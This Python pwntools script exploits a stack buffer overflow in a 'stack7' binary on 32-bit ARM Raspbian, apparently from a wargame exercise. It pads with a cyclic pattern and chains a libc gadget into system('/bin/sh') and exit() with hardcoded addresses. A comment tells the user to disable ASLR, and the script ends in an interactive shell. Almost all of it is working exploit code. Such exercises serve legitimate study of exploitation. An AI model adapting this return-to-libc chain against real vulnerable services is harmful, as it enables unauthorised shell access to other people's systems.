# Tested on 64bit Ubuntu, macOS
# Target : 32bit ARM, Raspberry Pi, Raspbian OS
# Python 3.7.6
# pwntools 4.2.2

# import all modules/commands from pwn library
from pwn import *
import time

# disable ASLR
# echo 0 > /proc/sys/kernel/randomize_va_space

# set the context of the target platform
#  arch: arm (32bit)
#  os: linux
context.update(arch='arm', os='linux')

p = process("./stack7")

# Creating Payload
payload = b''
payload += cyclic(80)

LIBC_BASE = 0x76e53000
GADGET = LIBC_BASE + 0xda9c0 # pop  {r0, r1, r2, r3, ip, lr}; bx ip;
SYSTEM = 0x76e8b9c8
BINSH = 0x76f7eb6c
EXIT = 0x76e81780

payload += p32(GADGET)  # gadget : pop  {r0, r1, r2, r3, ip, lr}; bx ip;
payload += p32(BINSH)   # r0 : /bin/sh
payload += b'AAAA'      # r1 : dummy value
payload += b'BBBB'      # r2 : dummy value
payload += b'CCCC'      # r3 : dummy value
payload += p32(SYSTEM)  # ip : addr of system() (bx ip : call system func)
payload += p32(EXIT)    # lr : addr of exit() (graceful shutdown) 

print("payload len : {}".format(len(payload)))
print("paylaod     : {}".format(payload))

# Sending Payload
print("[+] Sending payload..")
p.sendline(payload)
sleep(1)

p.interactive()
